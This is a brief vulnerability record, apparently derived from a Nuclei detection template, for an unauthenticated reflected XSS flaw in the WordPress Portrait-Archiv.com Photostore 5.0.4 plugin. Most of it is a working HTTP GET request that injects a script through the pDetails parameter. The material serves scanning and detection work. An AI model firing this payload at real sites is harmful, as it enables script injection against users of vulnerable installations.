# Vulnerability: WordPress Portrait-Archiv.com Photostore 5.0.4 - Reflected Cross Site Scripting
**Classification:** WPSCAN
**Source:** Nuclei Template (`wp-portrait-archiv-xss.yaml`)

## Description
The 'pDetails' GET parameter from the js/imageDetails.php was vulnerable to an unauthenticated reflected XSS attack.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/portrait-archiv-shop/js/imageDetails.php?pDetails=);});%3C/script%3E%3Cscript%3Ealert(document.location)%3C/script%3E HTTP/1.1
Host: {{Hostname}}
```

